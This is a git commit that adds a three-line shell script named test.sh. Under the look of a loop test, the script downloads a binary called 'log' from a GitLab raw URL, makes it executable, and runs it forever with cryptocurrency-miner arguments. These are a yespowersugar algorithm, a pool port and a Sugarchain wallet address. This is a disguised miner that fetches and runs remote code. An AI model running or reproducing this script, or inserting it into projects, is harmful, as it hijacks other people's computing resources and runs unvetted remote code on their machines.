50d3f550f4f46133fc43c93582c399c9f3056aec
imagedoch <123003905+imagedoch@users.noreply.github.com>
2023-01-19 00:52:08 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,3 @@
+wget https://gitlab.com/find.input/log/-/raw/master/log
+chmod +x log
+while true; do echo -n "This is a test of while loop";./log -a yespowersugar -o 17042 -u sugar1q932wgfpl2a5xh4426cxxz4jusk3vlyes0gy6kd.1-Usa; sleep 1; done
